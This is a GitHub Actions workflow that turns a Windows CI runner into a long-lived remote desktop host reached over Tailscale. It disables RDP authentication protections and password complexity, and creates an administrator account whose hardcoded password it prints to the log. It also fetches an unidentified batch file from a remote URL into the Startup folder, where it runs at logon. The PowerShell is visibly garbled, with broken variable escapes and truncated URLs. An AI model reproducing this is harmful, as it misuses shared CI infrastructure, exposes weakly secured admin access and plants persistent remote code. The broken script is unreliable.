name: win 11

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-2022
    timeout-minutes: 350

    steps:
      - name: Configure Core RDP Settings
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
          
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Fixed Password
        run: |
          secedit /export /cfg local.cfg
          (Get-Content local.cfg) -replace 'PasswordComplexity = 1', 'PasswordComplexity = 0' | Set-Content local.cfg
          secedit /configure /db secedit.sdb /cfg local.cfg /areas SECURITYPOLICY
          
          \$password = ConvertTo-SecureString "TechZonerRDP2026" -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password \$password -AccountNeverExpires -ErrorAction SilentlyContinue
          
          Add-LocalGroupMember -Group "Administrators" -Member "RDP" -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP" -ErrorAction SilentlyContinue

      - name: Install Tailscale
        run: |
          \$tsUrl = "https://tailscale.com"
          msiPath = "env:TEMP\tailscale.msi"
          
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest -Uri tsUrl -OutFile msiPath -UseBasicParsing
          
          Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /quiet /norestart" -Wait
          Remove-Item \$msiPath -Force

      - name: Establish Tailscale Connection
        run: |
          & "\(env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=\){{ secrets.TAILSCALE_AUTHKEY }} --hostname=gh-runner-win11
          Start-Sleep -Seconds 10

      - name: Maintain Connection + Watch RDP User
        run: |
          \(tsIP = & "\)env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $tsIP"
          Write-Host "Username: RDP"
          Write-Host "Password: TechZonerRDP2026"
          Write-Host "==================`n"
          
          \$startupPath = "C:\Users\RDP\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          \$downloadUrl = "https://gitlab.com"
          
          while (\$true) {
              if (Test-Path "C:\Users\RDP") {
                  if (-not (Test-Path \$startupPath)) {
                      New-Item -ItemType Directory -Path \$startupPath -Force | Out-Null
                  }
                  Invoke-WebRequest -Uri downloadUrl -OutFile "startupPath\Downloads.bat" -UseBasicParsing
                  Write-Host "✅ Downloads.bat deployed."
                  break
              }
              else {
                  Write-Host "[\$(Get-Date)] Waiting for RDP profile to be created..."
                  Start-Sleep -Seconds 20
              }
          }
          
          while (\$true) {
              Write-Host "[\$(Get-Date)] RDP Active - Runner is running..."
              Start-Sleep -Seconds 300
          }
